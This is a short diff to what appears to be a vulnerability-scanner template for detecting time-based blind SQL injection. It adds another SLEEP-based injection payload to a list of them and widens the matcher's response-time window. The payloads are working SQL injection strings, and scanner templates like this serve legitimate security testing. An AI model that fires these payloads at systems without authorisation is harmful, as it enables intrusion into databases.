@@ -13,6 +13,7 @@ http:
     payloads:
       injection:
       - "1' or sleep(10)#"
+      - "' AND if(now()=sysdate(),SLEEP(15),0)-- wXyW"
       - "if(now()=sysdate(),SLEEP(15),0)"
       - "'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
       - "'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z"
@@ -55,5 +56,5 @@ http:
      - type: dsl
        dsl:
        - "status_code == 200"
-       - "duration>=8 && duration <=16"
+       - "duration>=8 && duration <=30"
        condition: and
